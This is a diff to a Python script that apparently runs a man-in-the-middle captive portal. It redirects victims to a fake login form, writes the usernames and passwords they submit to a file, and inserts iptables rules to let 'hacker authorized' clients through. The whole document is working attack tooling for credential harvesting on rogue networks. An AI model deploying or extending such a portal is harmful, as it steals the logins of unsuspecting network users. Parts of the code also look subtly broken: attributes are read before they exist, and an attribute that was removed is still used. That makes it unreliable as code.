@@ -440,32 +440,38 @@ a new, previously unknown, client request. Until they are authorized '''
 class CaptivePortal(http.server.SimpleHTTPRequestHandler):
     '''This is the captive portal'''
     def __init__(self, index, ipaddress, port):
-        self.index     = index
-        self.ipaddress = ipaddress
-        self.port      = port
+        self.index           = index
+        self.ipaddress       = ipaddress
+        self.port            = port
+        self.remote_IP       = self.client_address[0]
+        # of course we're in the pool already, we own the place!
+        self.networkaddrpool = [self.ipaddress]
 
     #this is the index of the captive portal
     #it simply redirects the user to the to login page
-    html_redirect = """
-    <html>
-    <head>
-        <meta http-equiv="refresh" content="0; url=http://{0}{1}{2}" />
-    </head>
-    <body>
-        <b>Redirecting to MITM hoasted captive portal page</b>
-    </body>
-    </html>
-    """.format(self.ipaddress, self.port, self.index)
-    html_login = """
-    <!DOCTYPE html>
-    <html>
-    <head>
-    <meta charset="utf-8" />
-    <title></title>
-    </head>
-    <body>
-    <form class="login" action="do_POST" method="post">
-    <input type="text" name="username" value="username">
+    def redirect(self):
+        return """
+<html>
+<head>
+<meta http-equiv="refresh" content="0; url=http://{0}{1}{2}" />
+</head>
+<body>
+    <b>Redirecting to MITM hoasted captive portal page</b>
+</body>
+</html>
+""".format(self.ipaddress, self.port, self.index)
+    
+    def login(self):
+        return """
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8" />
+<title></title>
+</head>
+<body>
+<form class="login" action="do_POST" method="post">
+<input type="text" name="username" value="username">
     <input type="text" name="password" value="password">
     <input type="submit" name="submit" value="submit">
     </form>
@@ -475,7 +481,7 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
 
     def authpassthrough(self):
         redprint('Updating IP tables to allow {0} through'.format(self.remote_IP))
-        payload = {
+        steps = {
         "IPTablesAcceptNAT": {
             "command"         : "iptables -t nat -I PREROUTING 1 -s {} -j ACCEPT".format(self.remote_IP),
             "info_message"    : "[+] Drop Invalid Packets",
@@ -493,19 +499,20 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
     def authenticate(self, username, password):
         for username_password in self.credentials:
             if username_password[0][0] == username and self.credentials[username_password[0][0]] == password:
-                remote_IP = self.client_address[0]
-                greenprint('New authorization from '+ remote_IP)
+                #remote_IP = self.client_address[0]
+                greenprint('New authorization from '+ self.remote_IP)
                 greenprint('adding to address pool')
-                self.networkaddrpool.append(remote_IP)
-                self.wfile.write("You are now hacker authorized. Navigate to any URL")
+                self.networkaddrpool.append(self.remote_IP)
+                redprint('Updating IP tables to allow {} through'.format(self.remote_IP))
                 self.authpassthrough()
+                self.wfile.write("You are now hacker authorized. Navigate to any URL")
             else:
                 self.wfile.write(self.html_login)
 
 
     def savecredentials(self, filename):
         remote_IP = self.client_address[0]
-        hostlist.append(remote_IP)
+        self.hostlist.append(self.remote_IP)
         self.formdata = cgi.FieldStorage()
         try:
             with open(filename, 'ab') as filehandle:
@@ -587,5 +594,3 @@ if __name__ == "__main__":
     # or serve a captured portal
     elif arguments.portal == True:
         BackendServer(arguments)
-
-        
